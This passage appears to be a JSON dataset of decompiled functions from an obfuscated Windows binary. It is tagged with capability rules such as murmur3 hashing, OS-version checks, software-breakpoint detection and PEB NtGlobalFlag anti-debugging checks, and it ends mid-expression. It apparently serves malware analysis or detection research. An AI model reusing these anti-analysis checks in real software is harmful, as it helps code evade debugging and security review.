        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004013ba) overlaps instruction at (ram,0x004013b9)\n// \n\nuint __cdecl fcn.00401350(int32_t lptstrFilename, uint s)\n\n{\n    ushort uVar1;\n    ushort uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_1ch;\n    uint var_16h;\n    uint hMem;\n    uint pBlock;\n    uint var_8h;\n    uint lpdwHandle;\n    \n    iVar4 = sub.VERSION.dll_GetFileVersionInfoSizeA();\n    if (iVar4 != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        *(lptstrFilename + 0x5750fc4d) = *(lptstrFilename + 0x5750fc4d) | 0x51;\n        sub.VERSION.dll_GetFileVersionInfoA();\n        uVar5 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n        sub.VERSION.dll_VerQueryValueA();\n        iVar4 = *(uVar5 + 8);\n        uVar1 = *(iVar4 + 0x10);\n        *(uVar5 - 0x1c) = *(iVar4 + 0x10) >> 0x10;\n        uVar3 = *(iVar4 + 0x14);\n        uVar2 = *(iVar4 + 0x14);\n        *(uVar5 - 0x1a) = uVar1;\n        *(uVar5 - 0x16) = uVar2;\n        *(uVar5 - 0x18) = uVar3 >> 0x10;\n        (*_sym.imp.MSVCRT.dll_sprintf)();\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)();\n        (*_sym.imp.KERNEL32.dll_GlobalFree)();\n    }\n    return 1;\n}\n",
        "token_count": 433
    },
    "004035e0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004036f3) overlaps instruction at (ram,0x004036f1)\n// \n\nint32_t * __fastcall fcn.004035e0(int32_t param_1, int32_t param_2, int32_t *param_3, int32_t *param_4)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint16_t uVar4;\n    int32_t *piVar5;\n    char cVar6;\n    uint32_t extraout_ECX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t unaff_EBX;\n    uchar *puVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t *unaff_EDI;\n    bool bVar13;\n    bool in_PF;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    float10 extraout_ST0;\n    float10 extraout_ST0_00;\n    float10 fVar14;\n    \n    puVar9 = &stack0xfffffffc;\n    if ((in_PF) || (puVar9 = &stack0xfffffffc,  !in_PF)) {\ncode_r0x00403603:\n        param_4 = fcn.004041f0(0, param_3, param_4 + 1 >> 1 & 0xffff | (param_4 + 1 >> 0x11) << 0x10);\n        uVar10 = param_4 & 0xffff;\n        bVar13 = false;\n        if ((uVar10 != 0) && (uVar10 == 0)) {\n            unaff_EBX = unaff_EBX + 1;\n            if (unaff_EBX == 0) {\n                puVar1 = extraout_ECX + 0xffffe2;\n                *puVar1 = *puVar1 << 1 | *puVar1 < 0;\n                pe_dos_header = pe_dos_header + (extraout_ECX >> 8);\n                uVar7 = extraout_ECX;\n                fVar14 = extraout_ST0;\n                goto code_r0x0040369b;\n            }\n            goto code_r0x0040362a;\n        }\n    }\n    else {\n        uVar10 = 0x34a96cf4;\n        puVar9 = *0x8b17b43a + 1;\n        uVar2 = param_2 + 1U | 0x8b;\n        param_4 = param_2 + 1U | 0x8b;\n        param_3 = unaff_EDI;\n        if (uVar2 < '\\0') goto code_r0x00403603;\n        cVar3 = param_4;\n        if (param_1 + -1 == 0 || uVar2 != 0) {\n            *param_4 = *param_4 + cVar3;\n            goto code_r0x00403603;\n        }\n        *param_4 = *param_4 + 1;\n        cVar6 = param_1 + -1;\n        *unaff_EDI = *unaff_EDI + cVar6;\n        *param_4 = *param_4 + cVar3;\n        *unaff_EDI = *unaff_EDI + cVar6;\n        *param_4 = *param_4 + cVar3;\n        *(unaff_EBX + 0x76) = *(unaff_EBX + 0x76) + cVar3;\ncode_r0x0040362a:\n        in_AF = 9 < (param_4 & 0xf) | in_AF;\n        puVar1 = (param_4 & 0xffff0000 | CONCAT11((param_4 >> 8) + in_AF, param_4 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        bVar13 = *puVar1 < unaff_EBX;\n        *puVar1 = *puVar1 - unaff_EBX;\n        uVar10 = uVar10 + 1;\n    }\n    param_3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(param_3);\n    *(puVar9 + 8) = param_3;\n    if ((bVar13) || (!bVar13)) {\n        uVar7 = param_3[0x16];\n        fVar14 = extraout_ST0_00;\n    }\n    else {\n        uVar2 = param_3;\n        cVar3 = uVar2 - *param_3;\n        uVar10 = uVar10 - 1;\n        fVar14 = func_0x101895c5((in_NT & 1) * 0x4000 | SBORROW1(uVar2, *param_3) * 0x800 | (in_IF & 1) * 0x200 |\n                                 (in_TF & 1) * 0x100 | (cVar3 < '\\0') * 0x80 | (cVar3 == '\\0') * 0x40 |\n                                 (in_AF & 1) * 0x10 | ((POPCOUNT(cVar3) & 1U) == 0) * 4 | uVar2 < *param_3);\n        uVar7 = unaff_EBX + 0x6652584f;\n        param_3 = param_3 + 1;\n    }\n    if (uVar10 < uVar7) {\n        param_3 = *(puVar9 + 8);\n        uVar10 = (uVar10 - uVar7 & 0xffff) - 1;\n    }\n    else {\n        uVar10 = uVar10 - (uVar7 & 0xffff);\n    }\ncode_r0x0040369b:\n    uVar4 = uVar7 >> 0x10;\n    bVar13 = -1 < uVar10 - uVar4;\n    if (uVar10 < uVar4) {\n        if ((bVar13) && (!bVar13)) {\n            *(param_3 + 7) = fVar14;\n            param_3 = param_3 + 5;\n            uVar10 = uVar10 + 5;\n        }\n        iVar11 = (uVar10 - (uVar7 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar11 = uVar10 - (uVar7 >> 0x10);\n    }\n    iVar8 = *(puVar9 + 0xc);\n    iVar12 = iVar11 + iVar8;\n    **(puVar9 + 0x14) = iVar12;\n    if ((SCARRY4(iVar11, iVar8) != iVar12 < 0) || (piVar5 = param_3,  SCARRY4(iVar11, iVar8) == iVar12 < 0)) {\n        iVar8 = param_3[0x16];\n        piVar5 = *(puVar9 + 0x10);\n    }\n    *piVar5 = iVar8;\n    return param_3;\n}\n",
        "token_count": 1589
    },
    "004041f0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404250) overlaps instruction at (ram,0x0040424e)\n// \n\nuint * __cdecl fcn.004041f0(uint *arg_8h, uint16_t *arg_ch, uint *arg_10h)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    uint *in_EAX;\n    uint *puVar3;\n    uint16_t in_CX;\n    uint32_t uVar4;\n    uint *in_EDX;\n    char *unaff_EBX;\n    uint16_t *unaff_EDI;\n    bool bVar5;\n    \n    bVar5 = -1 < (unaff_EBX & in_CX);\n    if (((bVar5) && (!bVar5)) &&\n       (puVar3 = in_EDX,  bVar5 = -0x74efba76 < in_EDX,  arg_10h = in_EDX,  in_EDX = in_EAX,  arg_ch = unaff_EDI,  bVar5\n       )) {\n        return puVar3;\n    }\n    uVar4 = arg_8h;\n    arg_8h = arg_10h;\n    if (arg_10h != NULL) {\n        do {\n            cVar2 = in_EDX;\n            uVar4 = uVar4 + *arg_ch;\n            in_EDX = uVar4 >> 0x10;\n            if (uVar4 >> 0x10 == 0) {\ncode_r0x0040425f:\n                arg_ch = arg_ch + 1;\n                in_EDX = arg_8h + -1;\n                arg_8h = in_EDX;\n            }\n            else if ((uVar4 < 0) || (uVar4 >= 0)) {\n                uVar4 = in_EDX + (uVar4 & 0xffff);\n                goto code_r0x0040425f;\n            }\n            *(uVar4 + 0xffffe1) = *(uVar4 + 0xffffe1) + cVar2;\n            *unaff_EBX = *unaff_EBX + cVar2;\n            cVar2 = *unaff_EBX;\n            puVar1 = unaff_EBX + 0x8458bc8;\n            *puVar1 = *puVar1 >> 3 | *puVar1 << 0x1d;\n            *in_EDX = 0x8458948;\n        } while (cVar2 != '\\0');\n    }\n    return (uVar4 >> 0x10) + uVar4;\n}\n",
        "token_count": 570
    },
    "00401a90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401be2) overlaps instruction at (ram,0x00401bdf)\n// \n// WARNING: Removing unreachable block (ram,0x00401ab6)\n// WARNING: Removing unreachable block (ram,0x00401bc5)\n\nuint * __fastcall fcn.00401a90(uint32_t param_1, uint32_t param_2, uint8_t **param_3)\n\n{\n    uint32_t *puVar1;\n    uint8_t *puVar2;\n    uint arg_8h;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int16_t iVar5;\n    code *pcVar6;\n    char cVar7;\n    uint16_t uVar8;\n    uint16_t uVar9;\n    uint32_t in_EAX;\n    uint8_t *puVar10;\n    uint *puVar11;\n    int32_t iVar12;\n    char *pcVar13;\n    uint uVar14;\n    uint uVar15;\n    uint arg_ch;\n    uint8_t uVar16;\n    uint32_t unaff_EBX;\n    int32_t iVar17;\n    uint *puVar18;\n    uint *puVar19;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar20;\n    uint32_t unaff_EDI;\n    uint8_t **ppuVar21;\n    uint8_t **ppuVar22;\n    uint16_t in_SS;\n    uchar in_CF;\n    uint8_t in_AF;\n    uchar in_ZF;\n    bool bVar23;\n    char in_SF;\n    bool bVar24;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char in_OF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    float10 in_ST0;\n    unkint10 in_ST2;\n    ulong uVar25;\n    uint64_t uVar26;\n    unkint10 in_ST3;\n    double in_stack_47c692c5;\n    uint arg_10h;\n    ushort uVar27;\n    uchar uVar28;\n    uchar uVar29;\n    ushort uVar30;\n    uint16_t uVar31;\n    ushort uVar32;\n    uint8_t uVar33;\n    uchar uVar34;\n    uchar uVar35;\n    uint16_t uVar36;\n    ushort uVar37;\n    ushort uVar38;\n    ushort uVar39;\n    ushort uVar40;\n    ushort uVar41;\n    uint uStack26;\n    int16_t iStack22;\n    uint16_t uStack20;\n    uint16_t uStack18;\n    \n    iStack22 = *0x10 + -4;\n    iVar5 = iStack22;\n    puVar11 = &stack0xfffffffc;\n    if ((in_OF == in_SF) && (uStack20 = unaff_EDI,  in_OF != in_SF)) {\n        unaff_ESI = unaff_ESI + -1;\n        *(unaff_EDI | &stack0xfffffffc) = in_EAX;\n        in_CF = 0;\n        in_OF = '\\0';\n        param_2 = param_2 & 0xffffff00;\n        uVar8 = in_EAX + (in_EAX >> 8) * 'y';\n        in_EAX = in_EAX & 0xffff0000 | uVar8;\n        in_SF = '\\0';\n        in_ZF = uVar8 == 0;\n        in_SS = uStack20;\n    }\n    uVar8 = uStack20;\n    *param_3 = 0x3b;\n    uStack20 = in_EAX;\n    if ((in_ZF || in_OF != in_SF) || (!in_ZF && in_OF == in_SF)) {\n        *(param_3 + 1) = 0x7a;\n        uStack18 = uStack20;\n    }\n    else {\n        in_ST0 = in_ST0 - in_stack_47c692c5;\n        puVar1 = param_2 + 0x66;\n        in_CF = CARRY4(*puVar1, param_3);\n        *puVar1 = *puVar1 + param_3;\n        uStack18 = in_EAX >> 0x10;\n        uVar8 = uStack20;\n    }\n    uStack20 = uVar8;\n    uStack26._2_2_ = param_1;\n    iStack22 = param_1 >> 0x10;\n    cVar7 = in_EAX;\n    bVar24 = cVar7 + -1 < '\\0';\n    bVar23 = cVar7 == '\\x01';\n    puVar20 = in_EAX & 0xffff0000 | uStack20;\n    *(param_3 + 2) = 0xf1;\n    if ((cVar7 < '\\x01') || (uStack20 = uStack26._2_2_,  '\\0' < cVar7)) {\n        iVar17 = CONCAT31(unaff_EBX >> 8, 0xa1);\n        *(param_3 + 3) = 0xa1;\n        puVar10 = puVar20;\n        puVar19 = &stack0xfffffffc;\n        if ((!bVar23) && (puVar19 = &stack0xfffffffc,  bVar23)) {\n            puVar18 = &iStack22;\n            puVar19 = &iStack22;\n            uStack20 = &stack0xfffffffc >> 0x10;\n            cVar7 = '\\x10';\n            do {\n                puVar11 = puVar11 + -1;\n                puVar18 = puVar18 + -1;\n                *puVar18 = *puVar11;\n                cVar7 = cVar7 + -1;\n                iStack22 = iVar5;\n            } while ('\\0' < cVar7);\n        }\n    }\n    else {\n        puVar10 = *0x74035f88 | 0x8bff8b66;\n        puVar2 = param_3 + -0x37fb8a25;\n        uVar16 = param_1 & 7;\n        *puVar2 = *puVar2 << uVar16 | *puVar2 >> 8 - uVar16;\n        uVar3 = (param_1 & 0x1f) != 0 && (*puVar2 & 1) != 0;\n        uVar4 = unaff_EBX - *(puVar20 + 0x11);\n        in_CF = unaff_EBX < *(puVar20 + 0x11) || uVar4 < uVar3;\n        iVar17 = uVar4 - uVar3;\n        bVar24 = iVar17 < 0;\n        bVar23 = iVar17 == 0;\n        puVar19 = &stack0xfffffffc;\n        unaff_ESI = puVar20;\n    }\n    *(param_3 + 1) = 0x45;\n    uVar8 = param_2;\n    puVar20 = unaff_ESI;\n    if ((!bVar23) && (bVar23)) {\n        puVar10 = puVar10 & 0xffffff00 | *0x4bb148d3;\n        puVar20 = unaff_ESI + 1;\n        out(*unaff_ESI, uVar8);\n    }\n    *(param_3 + 5) = 0x6e;\n    if ((!bVar24) && (bVar24)) {\n        ppuVar21 = param_3 + 1;\n        puVar2 = puVar20 + 4;\n        *(param_3 + 7) = in_ST0;\n        param_3 = param_3 + 5;\n        puVar20 = puVar20 + 5;\n        in_CF = *puVar2 < *ppuVar21;\n        bVar23 = *puVar2 == *ppuVar21;\n        in_ST2 = in_ST3;\n    }\n    uVar25 = in_ST2 >> 0x10;\n    *(param_3 + 6) = 0x22;\n    if ((!in_CF && !bVar23) && (in_CF || bVar23)) {\n        puVar10 = puVar10 & 0xe2f4cc58;\n    }\n    *(param_3 + 7) = 0x2e;\n    *(param_3 + 2) = 0x84;\n    uVar38 = param_2 >> 0x10;\n    bVar23 = false;\n    uVar9 = puVar10 + iVar17 | 0x11a9;\n    bVar24 = (POPCOUNT(uVar9 & 0xff) & 1U) != 0;\n    *(param_3 + 9) = 0x41;\n    if ((bVar24) && (!bVar24)) {\n        puVar11 = &stack0xffffa187;\n        cVar7 = '\\x1e';\n        do {\n            puVar19 = puVar19 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *puVar19;\n            cVar7 = cVar7 + -1;\n        } while ('\\0' < cVar7);\n        puVar11 = in(0x78);\n        return puVar11;\n    }\n    *(param_3 + 10) = 0x3c;\n    uVar16 = iVar17 >> 8;\n    ppuVar21 = param_3;\n    if ((-1 < uVar9) && (-1 >= uVar9)) {\n        out(0xc4, puVar10);\n        param_2 = param_2 & 0xffffff00 | param_2 ^ param_1;\n        ppuVar21 = param_3 + 1;\n        *param_3 = puVar10;\n        bVar23 = uVar16 < *puVar10;\n        uVar8 = in_SS;\n    }\n    *(ppuVar21 + 0xb) = 0x61;\n    if ((!bVar23) && (ppuVar22 = ppuVar21,  bVar23)) goto code_r0x00401bd0;\n    *(ppuVar21 + 3) = iVar17;\n    while( true ) {\n        uVar25 = in_ST2 >> 0x10;\n        puVar10 = puVar10 | 0x51;\n        uVar8 = param_2;\n        uVar38 = param_2 >> 0x10;\n        ppuVar22 = ppuVar21;\ncode_r0x00401bd0:\n        ppuVar21 = ppuVar22 + 1;\n        uVar33 = puVar10;\n        cVar7 = uVar33 - *ppuVar22;\n        uVar9 = (in_NT & 1) * 0x4000 | SBORROW1(uVar33, *ppuVar22) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                (cVar7 < '\\0') * 0x80 | (cVar7 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar7) & 1U) == 0) * 4\n                | uVar33 < *ppuVar22;\n        uVar33 = (in_ID & 1) * 0x200000 >> 0x10 | (in_VIP & 1) * 0x100000 >> 0x10 | (in_VIF & 1) * 0x80000 >> 0x10 |\n                 (in_AC & 1) * 0x40000 >> 0x10;\n        uVar28 = 0;\n        iVar12 = func_0x10187b52();\n        *(ppuVar22 + 0xe) = 5;\n        uVar29 = iVar17 >> 0x10;\n        uVar34 = iVar17 >> 0x18;\n        bVar23 = (POPCOUNT((uVar16 ^ 0x16 | iVar12 >> 8) - (uVar9 >> 8)) & 1U) == 0;\n        *(ppuVar22 + 0xf) = 0xe0;\n        if ((bVar23) || (uVar31 = iVar17,  uVar36 = uVar8,  uVar39 = uVar38,  !bVar23)) {\n            *(ppuVar22 + 4) = 0xee;\n            uVar36 = iVar12;\n            uVar39 = iVar12 >> 0x10;\n            uVar29 = uVar38;\n            uVar34 = uVar38 >> 8;\n            uVar31 = uVar8;\n        }\n        puVar20 = puVar20 + 0x46;\n        uVar26 = pmaxsw(uVar25, *(iVar12 + 0x51));\n        in_ST2 = uVar26 << 0x10;\n        bVar23 = (uVar8 - 5U & 0x44) == 0;\n        param_2 = CONCAT13(uVar28, CONCAT12(uVar33, uVar9)) & 0xffff0000 | uVar9;\n        iVar12 = CONCAT13(uVar34, CONCAT12(uVar29, uVar31));\n        pcVar13 = CONCAT22(uVar39, uVar36);\n        *(ppuVar22 + 0x11) = 0xd2;\n        if ((bVar23) || (!bVar23)) break;\n        in_AF = 9 < (uVar36 & 0xf) | in_AF;\n        puVar10 = uVar36 + in_AF * '\\x06' & 0xf;\n        if (iVar12 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    while( true ) {\n        *(ppuVar22 + 0x12) = 0x2d;\n        *(ppuVar22 + 0x13) = 0x7e;\n        *(ppuVar22 + 5) = 0x10;\n        *(ppuVar22 + 0x15) = 0xb6;\n        *(ppuVar22 + 0x16) = 0xe6;\n        uVar16 = uVar31 - 5U & 0x44;\n        bVar23 = (POPCOUNT(uVar16) & 1U) == 0;\n        *(ppuVar22 + 0x17) = 0x61;\n        puVar10 = puVar20;\n        if ((uVar16 != 0) && (uVar16 == 0)) {\n            pcVar13 = pcVar13 & 0xffffff00 | *0x4bb148d3;\n            puVar10 = puVar20 + 1;\n            out(*puVar20, uVar9);\n        }\n        *(ppuVar22 + 6) = 0x7b;\n        if ((bVar23) || (!bVar23)) goto code_r0x00401d17;\n        puVar20 = *ppuVar21;\n        *ppuVar21 = puVar10;\n        puVar19 = puVar19 - *(puVar19 + 0x5f9dff63);\n        if (-1 < puVar19) break;\n        *pcVar13 = *pcVar13 + pcVar13;\n    }\n    if (puVar20 < 0) {\ncode_r0x00401d17:\n        puVar11 = puVar19[3];\n        *puVar11 = 0x18;\n        return puVar11;\n    }\n    pcVar13 = iVar12 + 0x66;\n    *pcVar13 = *pcVar13 + uVar9;\n    uVar40 = 0x104;\n    uVar41 = 0;\n    uVar38 = SUB42(puVar19 + -0x43, 0);\n    uVar39 = puVar19 + -0x43 >> 0x10;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    puVar19[-1] = puVar20;\n    do {\n        uVar14 = fcn.00403a40();\n        uVar15 = fcn.00403a40();\n        arg_ch = fcn.00403a40();\n        uVar34 = uVar14;\n        uVar35 = uVar14 >> 8;\n        uVar37 = uVar14 >> 0x10;\n        arg_8h = puVar19[4];\n        uVar30 = arg_8h;\n        uVar32 = arg_8h >> 0x10;\n        fcn.00402960(arg_8h, uVar14, CONCAT22(uVar39, uVar38), CONCAT22(uVar41, uVar40));\n        uVar27 = uVar15;\n        uVar28 = uVar15 >> 0x10;\n        uVar29 = uVar15 >> 0x18;\n        uVar14 = puVar19[2];\n        arg_10h = uVar14;\n        fcn.00402960(uVar14, uVar15, CONCAT22(uVar32, uVar30), CONCAT22(uVar37, CONCAT11(uVar35, uVar34)));\n        uVar15 = puVar19[3];\n        fcn.00402960(uVar15, arg_ch, arg_10h, CONCAT13(uVar29, CONCAT12(uVar28, uVar27)));\n        pcVar6 = _sym.imp.MSVCRT.dll_sprintf;\n        iVar5 = puVar19;\n        (*_sym.imp.MSVCRT.dll_sprintf)(puVar19 + -0xc5, 0xf420, iVar5 + -0x10c, arg_8h);\n        iVar17 = fcn.00403a70(puVar19 + -0xc5);\n        if (iVar17 != 0) {\n            (*pcVar6)(puVar19 + -0x84, 0xf42c, iVar5 + -0x10c, uVar14);\n            iVar17 = fcn.00403a70(puVar19 + -0x84);\n            if (iVar17 != 0) {\n                (*pcVar6)(puVar19 + -0x84, 0xf42c, iVar5 + -0x10c, uVar15);\n                iVar17 = fcn.00403a70(puVar19 + -0x84);\n                if (iVar17 != 0) {\n                    iVar17 = 1;\n                    goto code_r0x00401e69;\n                }\n            }\n        }\n        iVar17 = puVar19[-1];\n        puVar19[-1] = iVar17 + 1;\n    } while (iVar17 + 1 < 3);\n    iVar17 = puVar19[-2];\ncode_r0x00401e69:\n    fcn.00402960(puVar19[5], 4, CONCAT22(uVar39, uVar38), CONCAT22(uVar41, uVar40));\n    return iVar17 != 0;\n}\n",
        "token_count": 4219
    },
    "00401e90": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401ee4) overlaps instruction at (ram,0x00401edf)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x004020c8)\n// WARNING: Removing unreachable block (ram,0x00401fb3)\n// WARNING: Removing unreachable block (ram,0x00402425)\n\nvoid fcn.00401e90(void)\n\n{\n    uint8_t uVar1;\n    uint32_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint8_t extraout_CL;\n    char extraout_CL_00;\n    int16_t extraout_CX;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX;\n    uint8_t extraout_DL;\n    uint8_t extraout_DL_00;\n    uint8_t extraout_DH;\n    char extraout_DH_00;\n    uint16_t extraout_DX;\n    ushort extraout_DX_00;\n    int32_t extraout_EDX;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    uint8_t *unaff_EBX;\n    uint8_t *unaff_EDI;\n    uchar *puVar7;\n    uint8_t **ppuVar8;\n    uint8_t **ppuVar9;\n    ushort in_SS;\n    uchar uVar10;\n    bool bVar11;\n    uint8_t in_AF;\n    bool bVar12;\n    uchar uVar13;\n    char cVar14;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar15;\n    char cVar16;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    float10 fVar17;\n    uint arg_ch;\n    uchar uVar18;\n    uchar uVar19;\n    uchar uVar20;\n    uint16_t uVar21;\n    ushort uVar22;\n    uchar uVar23;\n    \n    fcn.00401890(0x4103f8, 0x11, 0x41f420, 10);\n    uVar10 = 0;\n    bVar11 = (POPCOUNT((extraout_CX - 1U & unaff_EDI | 0x61be) & 0xff) & 1U) == 0;\n    fcn.00401890(0x4103f8, 0x11, 0x41f42c, 0x12);\n    if ((!bVar11) && (bVar11)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar1 = fcn.00401890(0x4103f8, 0x11, 0x41f440, 4);\n    if (!uVar10) {\n        unaff_EDI = unaff_EDI & 0xffff0000 | unaff_EDI & 0xff | (unaff_EDI >> 8) << 8;\n    }\n    ppuVar8 = unaff_EDI + 1;\n    cVar14 = uVar1 - *unaff_EDI;\n    uVar21 = (in_NT & 1) * 0x4000 | SBORROW1(uVar1, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (cVar14 < '\\0') * 0x80 | (cVar14 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar14) & 1U) == 0) * 4\n             | uVar1 < *unaff_EDI;\n    uVar1 = (in_ID & 1) * 0x200000 >> 0x10 | (in_VIP & 1) * 0x100000 >> 0x10 | (in_VIF & 1) * 0x80000 >> 0x10 |\n            (in_AC & 1) * 0x40000 >> 0x10;\n    uVar10 = 0;\n    func_0x10187e81();\n    fcn.00401890(0x4103f8, 0x11, 0x41f444, CONCAT13(uVar10, CONCAT12(uVar1, uVar21)));\n    fcn.00401890(0x4103f8, 0x11, 0x41f450, 7);\n    cVar15 = '\\0';\n    cVar14 = (extraout_CH | extraout_DL | 0x1f) < '\\0';\n    fcn.00401890(0x4103f8, 0x11, 0x41f458, 0xb);\n    uVar22 = 0x3f8;\n    uVar10 = fcn.00401890(0x4103f8, 0x11, 0x41f464, 0xc);\n    if ((cVar15 == cVar14) && (cVar15 != cVar14)) {\n        puVar7 = ppuVar8 | extraout_EDX + 0xcU;\n        ppuVar8 = puVar7 + 1;\n        *puVar7 = uVar10;\n        in_SS = uVar22;\n    }\n    uVar22 = 8;\n    uVar20 = 0;\n    uVar23 = 0;\n    uVar10 = 0x70;\n    uVar13 = 0xf4;\n    uVar18 = 0x41;\n    uVar19 = 0;\n    while( true ) {\n        fcn.00401890(0x4103f8, 0x11, CONCAT13(uVar19, CONCAT12(uVar18, CONCAT11(uVar13, uVar10))), \n                     CONCAT13(uVar23, CONCAT12(uVar20, uVar22)));\n        bVar11 = false;\n        puVar2 = fcn.00401890(0x4103f8, 0x11, 0x41f478, 0xd);\n        if ((bVar11) || (ppuVar8 = ppuVar8 & 0xffff0000 | ppuVar8 & 0xff | (ppuVar8 >> 8) << 8,  !bVar11)) break;\n        uVar10 = 0x8b;\n        uVar13 = 0xc0;\n        uVar18 = 0xf8;\n        uVar19 = 0xb7;\n        if (&stack0xffffffe0 < *puVar2 || puVar2 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.00401890(0x4103f8, 0x11, 0x41f488, 0x18);\n    fcn.00401890(0x4103f8, 0x11, 0x41f4a0, 0x25);\n    cVar15 = '\\0';\n    cVar14 = ((ppuVar8 | 0x2fff) - unaff_EBX ^ 0x7174) < 0;\n    fcn.00401890(0x4103f8, 0x11, 0x41f4c8, 10);\n    puVar3 = fcn.00401890(0x4103f8, 0x11, 0x41f4d4, 0xc);\n    ppuVar9 = ppuVar8;\n    if ((cVar15 == cVar14) && (cVar15 != cVar14)) {\n        out(0xc4, puVar3);\n        ppuVar9 = ppuVar8 + 1;\n        *ppuVar8 = puVar3;\n    }\n    fcn.00401890(0x4103f8, 0x11, 0x41f4e0, 0xd);\n    fcn.00401890(0x4103f8, 0x11, 0x41f4f0, 6);\n    fcn.00401890(0x4103f8, 0x11, 0x41f4f8, 5);\n    bVar11 = extraout_DH < extraout_CL;\n    uVar10 = extraout_DH - extraout_CL < '\\0';\n    bVar12 = extraout_DH == extraout_CL;\n    fcn.00401890(0x4103f8, 0x11, 0x41f500, 0xd);\n    if ((!bVar11 && !bVar12) && (bVar11 || bVar12)) {\n        uVar10 = &stack0xffffffd7 < 0;\n    }\n    fVar17 = fcn.00401890(0x4103f8, 0x11, 0x41f510, 0x19);\n    if ((!uVar10) && (uVar10)) {\n        *(ppuVar9 + 7) = fVar17;\n        ppuVar9 = ppuVar9 + 5;\n    }\n    uVar13 = 0xf;\n    uVar18 = 0;\n    uVar19 = 0;\n    uVar20 = 0;\n    arg_ch = 0x41f52c;\n    fcn.00401890(0x4103f8, 0x11, 0x41f52c, 0xf);\n    fcn.00401890(0x4103f8, 0x11, 0x41f53c, 0xe);\n    fcn.00401890(0x4103f8, 0x11, 0x41f54c, 0xd);\n    uVar10 = SUB41(unaff_EBX, 0);\n    fcn.00401890(0x4103f8, 0x11, 0x41f55c, 0xc);\n    fcn.00401890(0x4103f8, 0x11, 0x41f568, 0xf);\n    cVar14 = fcn.00401890(0x4103f8, 0x11, 0x41f578, 0xb);\n    bVar11 = false;\n    bVar12 = cVar14 == -0x36;\n    fcn.00401890(0x4103f8, 0x11, 0x41f584, 0xb);\n    if ((!bVar11 && !bVar12) && (bVar11 || bVar12)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00401890(0x4103f8, 0x11, 0x41f590, 0xb);\n    cVar15 = SBORROW1(extraout_DH_00, extraout_CL_00);\n    cVar14 = extraout_DH_00 - extraout_CL_00 < '\\0';\n    fcn.00401890(0x4103f8, 0x11, 0x41f59c, 10);\n    if ((!cVar15) && (cVar15)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar4 = fcn.00401890(0x4103f8, 0x11, 0x41f5a8, 0xc);\n    if (cVar15 == cVar14) {\n        uVar22 = unaff_EBX >> 8;\n        uVar23 = unaff_EBX >> 0x18;\n        if (cVar15 != cVar14) goto code_r0x004022e5;\n    }\n    uVar10 = 0xe;\n    uVar22 = 0;\n    uVar23 = 0;\n    uVar13 = 0xb4;\n    uVar18 = 0xf5;\n    uVar19 = 0x41;\n    uVar20 = 0;\n    arg_ch = 0x11;\ncode_r0x004022e5:\n    *(iVar4 + 0x11) = *(iVar4 + 0x11) + (extraout_ECX + 1 >> 8);\n    uVar21 = fcn.00401890(0x4103f8, arg_ch, CONCAT13(uVar20, CONCAT12(uVar19, CONCAT11(uVar18, uVar13))), \n                          CONCAT13(uVar23, CONCAT21(uVar22, uVar10)));\n    uVar21 = (extraout_DX & 0xff00 | (extraout_DX & 0x4e | 0x38) & uVar21) & uVar21 ^ 0x3c00;\n    uVar5 = (uVar21 & 0xff | (uVar21 >> 8) + 